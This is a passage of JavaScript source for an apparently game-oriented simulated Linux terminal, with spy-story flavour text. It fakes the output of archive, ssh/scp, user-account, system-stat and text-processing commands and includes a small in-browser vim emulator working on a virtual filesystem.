Access: (${entry.perms.substring(1)})  Uid: ( 1000/   ${entry.owner})   Gid: ( 1000/   ${entry.group})
Access: 2026-01-18 10:00:00.000000000 +0000
Modify: 2026-01-18 10:00:00.000000000 +0000
Change: 2026-01-18 10:00:00.000000000 +0000`;
    }

    _cmdTar(args) {
        // Parse flags - only check arguments that start with '-'
        const flagArgs = args.filter(a => a.startsWith('-'));
        const flagStr = flagArgs.join(' ');
        const hasT = flagArgs.some(a => a.includes('t')) || flagStr.includes('--list');
        const hasX = flagArgs.some(a => a.includes('x')) || flagStr.includes('--extract');
        const hasC = flagArgs.some(a => a.includes('c')) || flagStr.includes('--create');
        const hasV = flagArgs.some(a => a.includes('v')) || flagStr.includes('--verbose');

        // Find the archive file and other arguments
        const fileArgs = args.filter(a => !a.startsWith('-') && a !== '-C');
        // Handle -C flag specially - it's not a file arg
        const cIndex = args.indexOf('-C');
        const targetDir = cIndex >= 0 ? args[cIndex + 1] : null;
        // Remove targetDir from fileArgs if present
        const cleanFileArgs = targetDir ? fileArgs.filter(f => f !== targetDir) : fileArgs;
        const archiveFile = cleanFileArgs[0];
        const sourceFiles = cleanFileArgs.slice(1);

        if (!archiveFile) {
            return 'tar: You must specify one of the options\ntar: Error is not recoverable: exiting now';
        }

        // List contents (-t)
        if (hasT) {
            const archivePath = this._resolvePath(archiveFile);
            const archiveNode = this.fs[archivePath];

            if (!archiveNode) {
                return `tar: ${archiveFile}: Cannot open: No such file or directory`;
            }

            // Return the file's content which describes what's in the archive
            if (archiveNode.content) {
                return archiveNode.content;
            }
            return 'file1.txt\nfile2.txt\ndir1/';
        }

        // Extract (-x)
        if (hasX) {
            const archivePath = this._resolvePath(archiveFile);
            const archiveNode = this.fs[archivePath];

            if (!archiveNode) {
                return `tar: ${archiveFile}: Cannot open: No such file or directory`;
            }

            const destDir = targetDir || '.';
            const destPath = this._resolvePath(destDir);

            if (!this.fs[destPath]) {
                return `tar: ${destDir}: Cannot open: No such file or directory`;
            }

            // Simulate extraction
            const output = [];
            if (hasV) {
                output.push('x intel_report.pdf');
                output.push('x asset_photos/');
                output.push('x communications.log');
            }
            output.push(`Extracted to ${destDir}`);
            return output.join('\n');
        }

        // Create (-c)
        if (hasC) {
            if (sourceFiles.length === 0) {
                return 'tar: Cowardly refusing to create an empty archive';
            }

            // Verify source files exist
            for (const src of sourceFiles) {
                const srcPath = this._resolvePath(src);
                if (!this.fs[srcPath]) {
                    return `tar: ${src}: Cannot stat: No such file or directory`;
                }
            }

            // Get destination directory
            const archivePath = this._resolvePath(archiveFile);
            const parentPath = archivePath.substring(0, archivePath.lastIndexOf('/')) || '/';
            const archiveName = archivePath.split('/').pop();

            if (!this.fs[parentPath]) {
                return `tar: ${archiveFile}: Cannot open: No such file or directory`;
            }

            // Create the archive in the virtual filesystem
            this.fs[archivePath] = {
                type: 'file',
                perms: '-rw-r--r--',
                owner: this.user,
                group: this.user,
                size: 1024,
                content: `[ARCHIVE: ${sourceFiles.join(', ')}]`
            };

            // Add to parent's children
            if (this.fs[parentPath].children && !this.fs[parentPath].children.includes(archiveName)) {
                this.fs[parentPath].children.push(archiveName);
            }

            const output = [];
            if (hasV) {
                sourceFiles.forEach(f => output.push(`a ${f}`));
            }
            output.push(`Created ${archiveFile}`);
            return output.join('\n');
        }

        return 'tar: You must specify one of -c, -t, -x options';
    }

    _cmdGzip(args) {
        // gzip -t : Test integrity
        if (args.includes('-t') || args.includes('--test')) {
            const file = args.find(a => !a.startsWith('-'));
            if (!file) {
                return 'gzip: compressed data not read from terminal';
            }
            const filePath = this._resolvePath(file);
            if (!this.fs[filePath]) {
                return `gzip: ${file}: No such file or directory`;
            }
            return `${file}:    OK`;
        }

        // gzip -l : List compression info
        if (args.includes('-l') || args.includes('--list')) {
            const file = args.find(a => !a.startsWith('-'));
            if (!file) {
                return 'gzip: compressed data not read from terminal';
            }
            const filePath = this._resolvePath(file);
            const node = this.fs[filePath];
            if (!node) {
                return `gzip: ${file}: No such file or directory`;
            }
            const compressed = node.size || 1024;
            const uncompressed = Math.floor(compressed * 2.5);
            const ratio = ((1 - compressed/uncompressed) * 100).toFixed(1);
            return `         compressed        uncompressed  ratio uncompressed_name\n         ${compressed}                ${uncompressed}  ${ratio}% ${file.replace('.gz', '')}`;
        }

        // gzip -d : Decompress (same as gunzip)
        if (args.includes('-d') || args.includes('--decompress')) {
            return this._cmdGunzip(args.filter(a => a !== '-d' && a !== '--decompress'));
        }

        // gzip <file> : Compress
        const file = args.find(a => !a.startsWith('-'));
        if (!file) {
            return 'gzip: compressed data not written to terminal';
        }
        const filePath = this._resolvePath(file);
        if (!this.fs[filePath]) {
            return `gzip: ${file}: No such file or directory`;
        }
        return `${file} compressed to ${file}.gz`;
    }

    _cmdGunzip(args) {
        const file = args.find(a => !a.startsWith('-'));
        if (!file) {
            return 'gunzip: compressed data not read from terminal';
        }
        const filePath = this._resolvePath(file);
        if (!this.fs[filePath]) {
            return `gunzip: ${file}: No such file or directory`;
        }
        const outputName = file.endsWith('.gz') ? file.slice(0, -3) : file + '.out';
        return `${file} decompressed to ${outputName}`;
    }

    _cmdZip(args, cmd) {
        const isUnzip = cmd === 'unzip';

        // unzip -l : List contents
        if (isUnzip && args.includes('-l')) {
            const file = args.find(a => !a.startsWith('-'));
            if (!file) {
                return 'unzip: missing archive';
            }
            const filePath = this._resolvePath(file);
            const node = this.fs[filePath];
            if (!node) {
                return `unzip: cannot find ${file}`;
            }
            if (node.content) {
                return `Archive:  ${file}\n${node.content}`;
            }
            return `Archive:  ${file}\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n     1024  01-15-2024 03:00   file1.txt\n     2048  01-15-2024 03:00   file2.txt\n---------                     -------\n     3072                     2 files`;
        }

        // unzip <file> : Extract
        if (isUnzip) {
            const file = args.find(a => !a.startsWith('-'));
            if (!file) {
                return 'unzip: missing archive';
            }
            const filePath = this._resolvePath(file);
            if (!this.fs[filePath]) {
                return `unzip: cannot find or open ${file}`;
            }
            return `Archive:  ${file}\n  inflating: file1.txt\n  inflating: file2.txt\nExtracted to current directory`;
        }

        // zip -r <archive> <files> : Create
        const dashR = args.includes('-r');
        const fileArgs = args.filter(a => !a.startsWith('-'));
        if (fileArgs.length < 2) {
            return 'zip: missing archive or files';
        }
        const archive = fileArgs[0];
        const sources = fileArgs.slice(1);
        return `  adding: ${sources.join('\n  adding: ')}\nCreated ${archive}`;
    }

    _cmdSshKeygen(args) {
        if (args.includes('-t')) {
            return `Generating public/private ${args[args.indexOf('-t') + 1] || 'rsa'} key pair.
Your identification has been saved in /home/${this.user}/.ssh/id_${args[args.indexOf('-t') + 1] || 'rsa'}
Your public key has been saved in /home/${this.user}/.ssh/id_${args[args.indexOf('-t') + 1] || 'rsa'}.pub
The key fingerprint is:
SHA256:abcdefghijklmnopqrstuvwxyz123456789 ${this.user}@${this.hostname}`;
        }
        return 'ssh-keygen: generate authentication keys';
    }

    _cmdSsh(args) {
        if (!args.length) return 'usage: ssh user@host';

        // Find the host (not a flag)
        const host = args.find(a => !a.startsWith('-'));
        if (!host) return 'usage: ssh user@host';

        // Handle -T flag (test connection, no TTY)
        const testMode = args.includes('-T');

        if (testMode) {
            return `Hi ${this.user}! You've successfully authenticated to ${host}.\nConnection to ${host} verified. relay channel ready.`;
        }

        return `ssh: connected to ${host} port 22\nWelcome to ${host}\nLast login: Jan 18 09:00:00 2026\nauthenticated as ${this.user}`;
    }

    _cmdScp(args) {
        if (args.length < 2) return 'usage: scp source dest';

        // Find source and destination
        const fileArgs = args.filter(a => !a.startsWith('-'));
        const source = fileArgs[0];
        const dest = fileArgs[1] || 'remote:';

        // Check if source file exists
        const sourcePath = this._resolvePath(source);
        if (this.fs[sourcePath]) {
            const size = this.fs[sourcePath].size || 1024;
            return `${source}                                    100% ${size}     1.2MB/s   00:00\nFile transfer complete to ${dest}`;
        }

        // Generic response for any file
        return `${source}                                    100% 2516KB   2.5MB/s   00:01\nUMBRA package transfer complete to ${dest}`;
    }

    _cmdPing(args) {
        const host = args.filter(a => !a.startsWith('-'))[0];
        if (!host) return 'ping: missing host operand';
        return `PING ${host} (93.184.216.34) 56(84) bytes of data.
64 bytes from ${host}: icmp_seq=1 ttl=56 time=11.4 ms
64 bytes from ${host}: icmp_seq=2 ttl=56 time=10.8 ms
--- ${host} ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 10.800/11.100/11.400/0.300 ms`;
    }

    _cmdNslookup(args) {
        const host = args[0];
        if (!host) return 'nslookup: missing host';
        return `Server:  8.8.8.8
Address: 8.8.8.8#53

Non-authoritative answer:
Name:    ${host}
Address: 93.184.216.34`;
    }

    _cmdArp() {
        return `Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.1.1              ether   00:11:22:33:44:55   C                     eth0
192.168.1.50             ether   aa:bb:cc:dd:ee:ff   C                     eth0`;
    }

    _cmdRoute() {
        return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0`;
    }

    _cmdLsblk() {
        return `NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
sda      8:0    0   100G  0 disk
├─sda1   8:1    0    50G  0 part /
└─sda2   8:2    0    50G  0 part /home
sdb      8:16   0   500G  0 disk
└─sdb1   8:17   0   500G  0 part /data`;
    }

    _cmdMount() {
        return `/dev/sda1 on / type ext4 (rw,relatime)
/dev/sda2 on /home type ext4 (rw,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
/dev/sdb1 on /data type ext4 (rw,relatime)`;
    }

    _cmdGetfacl(args) {
        const file = args[0];
        if (!file) return 'getfacl: missing file operand';
        return `# file: ${file}
# owner: ${this.user}
# group: ${this.user}
user::rw-
group::r--
other::r--`;
    }

    _cmdGetcap(args) {
        // Use config capabilities if available
        if (this.config.capabilities) {
            return this.config.capabilities;
        }
        // Default - no special capabilities
        if (args.includes('-r')) {
            return `/usr/bin/ping cap_net_raw=ep`;
        }
        const file = args.filter(a => !a.startsWith('-'))[0];
        if (!file) return '';
        return '';
    }

    _cmdGetent(args) {
        // getent - query user/group databases
        const database = args[0];
        const key = args[1];

        if (!database) {
            return 'Usage: getent database [key]';
        }

        // Read from /etc/passwd or /etc/group in filesystem
        if (database === 'passwd') {
            const passwdFile = this.fs['/etc/passwd'];
            if (!passwdFile || !passwdFile.content) {
                return `getent: no such database: ${database}`;
            }
            const lines = passwdFile.content.trim().split('\n');
            if (key) {
                // Find specific user
                const match = lines.find(l => l.startsWith(key + ':') || l.includes(':' + key + ':'));
                return match || `getent: ${database}: key not found: ${key}`;
            }
            return lines.join('\n');
        }

        if (database === 'group') {
            const groupFile = this.fs['/etc/group'];
            if (!groupFile || !groupFile.content) {
                return `getent: no such database: ${database}`;
            }
            const lines = groupFile.content.trim().split('\n');
            if (key) {
                const match = lines.find(l => l.startsWith(key + ':'));
                return match || `getent: ${database}: key not found: ${key}`;
            }
            return lines.join('\n');
        }

        if (database === 'shadow') {
            return `getent: permission denied: ${database}`;
        }

        return `getent: unknown database: ${database}`;
    }

    _cmdChage(args) {
        // chage - password aging info
        const listMode = args.includes('-l');
        const user = args.filter(a => !a.startsWith('-'))[0];

        if (!user) {
            return 'chage: Usage: chage [options] username';
        }

        // Check if user exists in /etc/passwd
        const passwdFile = this.fs['/etc/passwd'];
        if (passwdFile && passwdFile.content) {
            const userExists = passwdFile.content.split('\n').some(l => l.startsWith(user + ':'));
            if (!userExists) {
                return `chage: user '${user}' does not exist`;
            }
        }

        if (listMode) {
            // Use config if available, otherwise default
            if (this.config.chageInfo && this.config.chageInfo[user]) {
                return this.config.chageInfo[user];
            }
            // Default output
            return `Last password change                                    : Jan 15, 2026
Password expires                                        : never
Password inactive                                       : never
Account expires                                         : never
Minimum number of days between password change          : 0
Maximum number of days between password change          : 99999
Number of days of warning before password expires       : 7`;
        }

        return 'chage: permission denied (use sudo)';
    }

    _cmdPasswd(args) {
        // passwd - password status or change
        const statusMode = args.includes('-S');
        const user = args.filter(a => !a.startsWith('-'))[0] || this.user;

        if (statusMode) {
            // Check if user exists
            const passwdFile = this.fs['/etc/passwd'];
            if (passwdFile && passwdFile.content) {
                const userExists = passwdFile.content.split('\n').some(l => l.startsWith(user + ':'));
                if (!userExists) {
                    return `passwd: user '${user}' does not exist`;
                }
            }

            // Use config if available
            if (this.config.passwdStatus && this.config.passwdStatus[user]) {
                return this.config.passwdStatus[user];
            }

            // Default status output: user status lastchange min max warn inactive expire
            // P = password set, L = locked, NP = no password
            return `${user} P 01/15/2026 0 99999 7 -1 -1`;
        }

        // Changing password requires root
        return 'passwd: requires root privileges (use sudo)';
    }

    _cmdVim(args) {
        const file = args.filter(a => !a.startsWith('-'))[0];

        // Initialize vim mode
        this._vimFile = file ? this._resolvePath(file) : null;
        this._vimMode = 'normal';
        this._vimCursorLine = 0;
        this._vimCursorCol = 0;
        this._vimCommandBuffer = '';
        this._vimMessage = '';
        this._vimModified = false;

        // Load file content or start with empty buffer
        if (this._vimFile && this.fs[this._vimFile]) {
            this._vimContent = (this.fs[this._vimFile].content || '').split('\n');
        } else {
            this._vimContent = [''];
            if (this._vimFile) {
                this._vimMessage = `"${file}" [New File]`;
            }
        }

        // Hide the command input visually but keep it focusable for keyboard events
        this.inputEl.style.opacity = '0';
        this.inputEl.style.position = 'absolute';
        this.inputEl.style.pointerEvents = 'none';
        this.inputEl.focus();
        this._renderVim();

        return ''; // No output, vim takes over the display
    }

    _handleVimKey(e) {
        e.preventDefault();

        if (this._vimMode === 'command') {
            this._handleVimCommandMode(e);
        } else if (this._vimMode === 'insert') {
            this._handleVimInsertMode(e);
        } else {
            this._handleVimNormalMode(e);
        }

        this._renderVim();
    }

    _handleVimNormalMode(e) {
        const key = e.key;

        // Movement keys
        switch (key) {
            case 'h': case 'ArrowLeft':
                this._vimCursorCol = Math.max(0, this._vimCursorCol - 1);
                break;
            case 'j': case 'ArrowDown':
                this._vimCursorLine = Math.min(this._vimContent.length - 1, this._vimCursorLine + 1);
                this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
                break;
            case 'k': case 'ArrowUp':
                this._vimCursorLine = Math.max(0, this._vimCursorLine - 1);
                this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
                break;
            case 'l': case 'ArrowRight':
                const lineLen = (this._vimContent[this._vimCursorLine] || '').length;
                this._vimCursorCol = Math.min(lineLen, this._vimCursorCol + 1);
                break;
            case '0':
                this._vimCursorCol = 0;
                break;
            case '$':
                this._vimCursorCol = (this._vimContent[this._vimCursorLine] || '').length;
                break;
            case 'g':
                if (this._vimCommandBuffer === 'g') {
                    this._vimCursorLine = 0;
                    this._vimCursorCol = 0;
                    this._vimCommandBuffer = '';
                } else {
                    this._vimCommandBuffer = 'g';
                }
                break;
            case 'G':
                this._vimCursorLine = this._vimContent.length - 1;
                this._vimCursorCol = 0;
                break;
            case 'w':
                // Move to next word
                this._vimMoveWord(1);
                break;
            case 'b':
                // Move to previous word
                this._vimMoveWord(-1);
                break;

            // Enter insert mode
            case 'i':
                this._vimMode = 'insert';
                this._vimMessage = '-- INSERT --';
                break;
            case 'a':
                this._vimMode = 'insert';
                this._vimCursorCol = Math.min(this._vimCursorCol + 1, (this._vimContent[this._vimCursorLine] || '').length);
                this._vimMessage = '-- INSERT --';
                break;
            case 'A':
                this._vimMode = 'insert';
                this._vimCursorCol = (this._vimContent[this._vimCursorLine] || '').length;
                this._vimMessage = '-- INSERT --';
                break;
            case 'I':
                this._vimMode = 'insert';
                this._vimCursorCol = 0;
                this._vimMessage = '-- INSERT --';
                break;
            case 'o':
                this._vimContent.splice(this._vimCursorLine + 1, 0, '');
                this._vimCursorLine++;
                this._vimCursorCol = 0;
                this._vimMode = 'insert';
                this._vimMessage = '-- INSERT --';
                this._vimModified = true;
                break;
            case 'O':
                this._vimContent.splice(this._vimCursorLine, 0, '');
                this._vimCursorCol = 0;
                this._vimMode = 'insert';
                this._vimMessage = '-- INSERT --';
                this._vimModified = true;
                break;

            // Editing
            case 'x':
                // Delete character under cursor
                if (this._vimContent[this._vimCursorLine]) {
                    const line = this._vimContent[this._vimCursorLine];
                    this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol) + line.slice(this._vimCursorCol + 1);
                    this._vimModified = true;
                }
                break;
            case 'd':
                if (this._vimCommandBuffer === 'd') {
                    // dd - delete line
                    if (this._vimContent.length > 1) {
                        this._vimContent.splice(this._vimCursorLine, 1);
                        this._vimCursorLine = Math.min(this._vimCursorLine, this._vimContent.length - 1);
                    } else {
                        this._vimContent[0] = '';
                    }
                    this._vimModified = true;
                    this._vimCommandBuffer = '';
                } else {
                    this._vimCommandBuffer = 'd';
                }
                break;
            case 'y':
                if (this._vimCommandBuffer === 'y') {
                    // yy - yank line
                    this._vimYankBuffer = this._vimContent[this._vimCursorLine];
                    this._vimMessage = '1 line yanked';
                    this._vimCommandBuffer = '';
                } else {
                    this._vimCommandBuffer = 'y';
                }
                break;
            case 'p':
                // Paste after
                if (this._vimYankBuffer !== undefined) {
                    this._vimContent.splice(this._vimCursorLine + 1, 0, this._vimYankBuffer);
                    this._vimCursorLine++;
                    this._vimModified = true;
                }
                break;
            case 'P':
                // Paste before
                if (this._vimYankBuffer !== undefined) {
                    this._vimContent.splice(this._vimCursorLine, 0, this._vimYankBuffer);
                    this._vimModified = true;
                }
                break;
            case 'u':
                this._vimMessage = 'Undo not supported in simulation';
                break;

            // Enter command mode
            case ':':
                this._vimMode = 'command';
                this._vimCommandBuffer = ':';
                break;

            // Search (basic)
            case '/':
                this._vimMode = 'command';
                this._vimCommandBuffer = '/';
                break;

            // Escape clears command buffer
            case 'Escape':
                this._vimCommandBuffer = '';
                this._vimMessage = '';
                break;

            default:
                // Clear buffer for unrecognized keys
                if (this._vimCommandBuffer && key.length === 1) {
                    this._vimCommandBuffer = '';
                }
        }
    }

    _handleVimInsertMode(e) {
        const key = e.key;

        if (key === 'Escape') {
            this._vimMode = 'normal';
            this._vimMessage = '';
            this._vimCursorCol = Math.max(0, this._vimCursorCol - 1);
            return;
        }

        const line = this._vimContent[this._vimCursorLine] || '';

        if (key === 'Backspace') {
            if (this._vimCursorCol > 0) {
                this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol - 1) + line.slice(this._vimCursorCol);
                this._vimCursorCol--;
            } else if (this._vimCursorLine > 0) {
                // Join with previous line
                const prevLine = this._vimContent[this._vimCursorLine - 1] || '';
                this._vimCursorCol = prevLine.length;
                this._vimContent[this._vimCursorLine - 1] = prevLine + line;
                this._vimContent.splice(this._vimCursorLine, 1);
                this._vimCursorLine--;
            }
            this._vimModified = true;
        } else if (key === 'Enter') {
            const before = line.slice(0, this._vimCursorCol);
            const after = line.slice(this._vimCursorCol);
            this._vimContent[this._vimCursorLine] = before;
            this._vimContent.splice(this._vimCursorLine + 1, 0, after);
            this._vimCursorLine++;
            this._vimCursorCol = 0;
            this._vimModified = true;
        } else if (key === 'Tab') {
            this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol) + '    ' + line.slice(this._vimCursorCol);
            this._vimCursorCol += 4;
            this._vimModified = true;
        } else if (key === 'ArrowLeft') {
            this._vimCursorCol = Math.max(0, this._vimCursorCol - 1);
        } else if (key === 'ArrowRight') {
            this._vimCursorCol = Math.min(line.length, this._vimCursorCol + 1);
        } else if (key === 'ArrowUp') {
            this._vimCursorLine = Math.max(0, this._vimCursorLine - 1);
            this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
        } else if (key === 'ArrowDown') {
            this._vimCursorLine = Math.min(this._vimContent.length - 1, this._vimCursorLine + 1);
            this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
        } else if (key.length === 1) {
            // Insert character
            this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol) + key + line.slice(this._vimCursorCol);
            this._vimCursorCol++;
            this._vimModified = true;
        }
    }

    _handleVimCommandMode(e) {
        const key = e.key;

        if (key === 'Escape') {
            this._vimMode = 'normal';
            this._vimCommandBuffer = '';
            this._vimMessage = '';
            return;
        }

        if (key === 'Enter') {
            this._executeVimCommand(this._vimCommandBuffer);
            return;
        }

        if (key === 'Backspace') {
            if (this._vimCommandBuffer.length > 1) {
                this._vimCommandBuffer = this._vimCommandBuffer.slice(0, -1);
            } else {
                this._vimMode = 'normal';
                this._vimCommandBuffer = '';
            }
            return;
        }

        if (key.length === 1) {
            this._vimCommandBuffer += key;
        }
    }

    _executeVimCommand(cmd) {
        const command = cmd.slice(1); // Remove leading : or /

        if (cmd.startsWith('/')) {
            // Search
            const pattern = command;
            if (pattern) {
                const regex = new RegExp(pattern, 'i');
                for (let i = this._vimCursorLine + 1; i < this._vimContent.length; i++) {
                    if (regex.test(this._vimContent[i])) {
                        this._vimCursorLine = i;
                        this._vimCursorCol = this._vimContent[i].search(regex);
                        this._vimMessage = '';
                        break;
                    }
                }
            }
            this._vimMode = 'normal';
            this._vimCommandBuffer = '';
            return;
        }

        // Command mode commands
        switch (command) {
            case 'w':
                this._vimSave();
                break;
            case 'q':
                if (this._vimModified) {
                    this._vimMessage = 'E37: No write since last change (add ! to override)';
                } else {
                    this._exitVim();
                    return; // Exit before resetting _vimMode
                }
                break;
            case 'q!':
                this._exitVim();
                return; // Exit before resetting _vimMode
            case 'wq':
            case 'x':
                this._vimSave();
                this._trackVimExit(true); // Clean exit achievement
                this._exitVim();
                return; // Exit before resetting _vimMode
            case 'set nu':
            case 'set number':
                this._vimShowLineNumbers = true;
                this._vimMessage = '';
                break;
            case 'set nonu':
            case 'set nonumber':
                this._vimShowLineNumbers = false;
                this._vimMessage = '';
                break;
            default:
                if (command.match(/^\d+$/)) {
                    // Go to line number
                    const lineNum = parseInt(command) - 1;
                    this._vimCursorLine = Math.max(0, Math.min(lineNum, this._vimContent.length - 1));
                    this._vimCursorCol = 0;
                    this._vimMessage = '';
                } else {
                    this._vimMessage = `E492: Not an editor command: ${command}`;
                }
        }

        this._vimMode = 'normal';
        this._vimCommandBuffer = '';
    }

    _vimSave() {
        if (!this._vimFile) {
            this._vimMessage = 'E32: No file name';
            return;
        }

        const content = this._vimContent.join('\n');
        const parentPath = this._vimFile.substring(0, this._vimFile.lastIndexOf('/')) || '/';
        const fileName = this._vimFile.substring(this._vimFile.lastIndexOf('/') + 1);

        // Create or update file
        this.fs[this._vimFile] = {
            type: 'file',
            content: content,
            perms: '-rw-r--r--',
            owner: this.user,
            group: this.user
        };

        // Add to parent directory if not already there
        if (this.fs[parentPath] && this.fs[parentPath].children && !this.fs[parentPath].children.includes(fileName)) {
            this.fs[parentPath].children.push(fileName);
        }

        this._vimModified = false;
        this._vimMessage = `"${this._vimFile}" ${this._vimContent.length}L, ${content.length}C written`;
    }

    _exitVim() {
        this._vimMode = null;
        this._vimFile = null;
        this._vimContent = [];
        this._vimCommandBuffer = '';
        this._vimMessage = '';

        // Restore terminal display and input visibility
        this.inputEl.style.opacity = '';
        this.inputEl.style.position = '';
        this.inputEl.style.pointerEvents = '';
        this.inputEl.value = ''; // Clear any leftover input
        this._renderVimCleanup();
        this.inputEl.focus();
    }

    _vimMoveWord(direction) {
        const line = this._vimContent[this._vimCursorLine] || '';
        if (direction > 0) {
            // Forward
            const rest = line.slice(this._vimCursorCol);
            const match = rest.match(/^\S*\s*/);
            if (match) {
                this._vimCursorCol += match[0].length;
                if (this._vimCursorCol >= line.length && this._vimCursorLine < this._vimContent.length - 1) {
                    this._vimCursorLine++;
                    this._vimCursorCol = 0;
                }
            }
        } else {
            // Backward
            if (this._vimCursorCol === 0 && this._vimCursorLine > 0) {
                this._vimCursorLine--;
                this._vimCursorCol = (this._vimContent[this._vimCursorLine] || '').length;
            } else {
                const before = line.slice(0, this._vimCursorCol);
                const match = before.match(/\s*\S*$/);
                if (match) {
                    this._vimCursorCol -= match[0].length;
                }
            }
        }
    }

    _renderVim() {
        // Create vim-style display
        const visibleLines = 20;
        const startLine = Math.max(0, this._vimCursorLine - Math.floor(visibleLines / 2));
        const endLine = Math.min(this._vimContent.length, startLine + visibleLines);

        let html = '<div class="vim-editor" style="font-family: monospace; background: #1a1a1a; color: #ccc; padding: 10px;">';

        // Header line (like vim)
        const fileName = this._vimFile ? this._vimFile.split('/').pop() : '[No Name]';
        html += `<div style="color: #666; margin-bottom: 5px;">${fileName}${this._vimModified ? ' [+]' : ''}</div>`;

        // Content lines with cursor
        for (let i = startLine; i < endLine; i++) {
            const lineNum = this._vimShowLineNumbers ? `<span style="color: #666; margin-right: 10px;">${String(i + 1).padStart(3)}</span>` : '';
            const line = this._vimContent[i] || '';

            if (i === this._vimCursorLine) {
                // Line with cursor
                const before = this._escapeHtml(line.slice(0, this._vimCursorCol));
                const cursor = line[this._vimCursorCol] || ' ';
                const after = this._escapeHtml(line.slice(this._vimCursorCol + 1));
                const cursorStyle = this._vimMode === 'insert'
                    ? 'border-left: 2px solid #0f0; background: transparent;'
                    : 'background: #fff; color: #000;';
                html += `<div>${lineNum}${before}<span style="${cursorStyle}">${this._escapeHtml(cursor)}</span>${after}</div>`;
            } else {
                html += `<div>${lineNum}${this._escapeHtml(line) || ' '}</div>`;
            }
        }

        // Fill empty lines with ~
        for (let i = endLine; i < startLine + visibleLines; i++) {
            html += `<div style="color: #00f;">~</div>`;
        }

        // Status line
        const modeDisplay = this._vimMode === 'insert' ? '-- INSERT --' :
                           this._vimMode === 'command' ? this._vimCommandBuffer : '';
        const posInfo = `${this._vimCursorLine + 1},${this._vimCursorCol + 1}`;

        html += `<div style="margin-top: 5px; display: flex; justify-content: space-between; color: #0f0;">`;
        html += `<span>${this._vimMessage || modeDisplay}</span>`;
        html += `<span>${posInfo}</span>`;
        html += `</div>`;

        // Command line (when in command mode)
        if (this._vimMode === 'command') {
            html += `<div style="color: #fff;">${this._vimCommandBuffer}<span style="background: #fff; color: #000;"> </span></div>`;
        }

        html += '</div>';

        // Replace terminal content with vim editor
        this.outputEl.innerHTML = html;

        // Add click handler to maintain focus
        this.outputEl.onclick = () => {
            if (this._vimMode) {
                this.inputEl.focus();
            }
        };
    }

    _renderVimCleanup() {
        // Remove vim click handler
        this.outputEl.onclick = null;
        // Restore normal terminal output
        this.outputEl.innerHTML = '';
    }

    _cmdVmstat() {
        return `procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 1  0      0 3355648 262144 2347320    0    0    12    25   50  100  2  1 97  0  0`;
    }

    _cmdIostat() {
        return `Linux 5.15.0-generic (${this.hostname})

avg-cpu:  %user   %nice %system %iowait  %steal   %idle
           2.34    0.00    0.98    0.15    0.00   96.53

Device             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn
sda               5.23        45.67        89.12    1234567    2345678`;
    }

    _cmdSar() {
        return `Linux 5.15.0-generic (${this.hostname})    01/18/2026

10:00:00 AM     CPU     %user     %nice   %system   %iowait    %steal     %idle
10:10:00 AM     all      2.34      0.00      0.98      0.15      0.00     96.53
10:20:00 AM     all      3.12      0.00      1.05      0.22      0.00     95.61
10:30:00 AM     all      2.89      0.00      0.87      0.18      0.00     96.06
Average:        all      2.78      0.00      0.97      0.18      0.00     96.07`;
    }

    // ═══════════════════════════════════════════════════════════════
    // TEXT PROCESSING COMMANDS
    // ═══════════════════════════════════════════════════════════════

    _cmdSort(args, pipeInput = null) {
        const reverse = args.includes('-r');
        const numeric = args.includes('-n');
        const unique = args.includes('-u');
        const file = args.filter(a => !a.startsWith('-'))[0];

        let content = pipeInput || '';
        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `sort: ${file}: No such file or directory`;
            if (entry.type !== 'file') return `sort: ${file}: Is a directory`;
            content = entry.content || '';
        }

        if (!content) return '';

        let lines = content.split('\n').filter(l => l);

        if (numeric) {
            lines.sort((a, b) => {
                const numA = parseFloat(a) || 0;
                const numB = parseFloat(b) || 0;
                return numA - numB;
            });
        } else {
            lines.sort();
        }

        if (reverse) lines.reverse();
        if (unique) lines = [...new Set(lines)];

        return lines.join('\n');
    }

    _cmdUniq(args, pipeInput = null) {
        const count = args.includes('-c');
        const duplicatesOnly = args.includes('-d');
        const uniqueOnly = args.includes('-u');
        const file = args.filter(a => !a.startsWith('-'))[0];

        let content = pipeInput || '';
        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `uniq: ${file}: No such file or directory`;
            if (entry.type !== 'file') return `uniq: ${file}: Is a directory`;
            content = entry.content || '';
        }

        if (!content) return '';

        const lines = content.split('\n');
        const result = [];
        let prevLine = null;
        let prevCount = 0;

        for (const line of lines) {
            if (line === prevLine) {
                prevCount++;
            } else {
                if (prevLine !== null) {
                    const isDuplicate = prevCount > 1;
                    if ((!duplicatesOnly && !uniqueOnly) ||
                        (duplicatesOnly && isDuplicate) ||
                        (uniqueOnly && !isDuplicate)) {
                        result.push(count ? `${String(prevCount).padStart(7)} ${prevLine}` : prevLine);
                    }
                }
                prevLine = line;
                prevCount = 1;
            }
        }

        // Handle last line
        if (prevLine !== null) {
            const isDuplicate = prevCount > 1;
            if ((!duplicatesOnly && !uniqueOnly) ||
                (duplicatesOnly && isDuplicate) ||
                (uniqueOnly && !isDuplicate)) {
                result.push(count ? `${String(prevCount).padStart(7)} ${prevLine}` : prevLine);
            }
        }

        return result.join('\n');
    }

    _cmdCut(args, pipeInput = null) {
